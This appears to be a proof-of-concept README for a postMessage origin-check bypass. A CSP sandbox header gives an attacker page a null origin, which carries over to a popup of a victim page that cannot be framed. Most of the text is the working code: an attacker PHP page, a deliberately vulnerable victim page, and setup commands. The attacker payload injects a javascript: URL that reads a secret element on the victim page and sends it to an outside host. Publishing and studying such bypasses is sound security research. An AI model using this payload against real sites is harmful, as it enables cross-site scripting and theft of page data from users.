## What for ?
Exploit for edge case, ```window.origin !== e.origin``` stuff + target unframeable case

(So the case where you can't iframe srcdoc + iframe target with sandbox attrib to cast null origin, and bypass the check as mentioned in Hacktricks
Here: https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/bypassing-sop-with-iframes-1.html )

## Setup & Description

Have these entries in /etc/hosts
```
127.0.0.1       lhacker.com
127.0.0.1       lvictim.com
```

Now, lesser known fact is that you can have a window with `null` origin via CSP, and the page opened by it also inherits the `null` origin

```mkdir demo_BCNPXSS  # bad check noframe partial xss```

Now let's create,

null.php:
```
<?php
header('Content-Security-Policy: sandbox allow-scripts allow-forms allow-popups allow-modals;');
?>
<script>
a=open('http://lvictim.com:7798/vuln.php'); 
setTimeout(()=>{
a.postMessage({url:`javascript:location.href='//example.com/?a='+encodeURIComponent(document.querySelector('#secret').innerText)`},'*')
}, 3000)
</script>
```

Now let's create a victim page, and make sure we can't frame it.

vuln.php:
```
<?php
header("X-Frame-Options: DENY");
?>
<script>
onmessage = (e)=>{
if (window.origin !== e.origin) {return}
location.href=e.data.url;
}
</script>
<p id=secret>
README :3
</p>
```

Now running the server, ```php -S 127.0.0.1:7798```

visiting the POC page:  http://lhacker.com:7798/null.php

Note origin check is being bypassed, but since sandbox is also inherited we can only partially exploit the XSS.

Note: you can after just in http://lhacker.com:7798/null.php  -->  console, check this `origin` - should return null, and same if u do `open('http://lvictim.com:7798/vuln.php')` or any other site,
then again in console check origin -> you shall see `null`
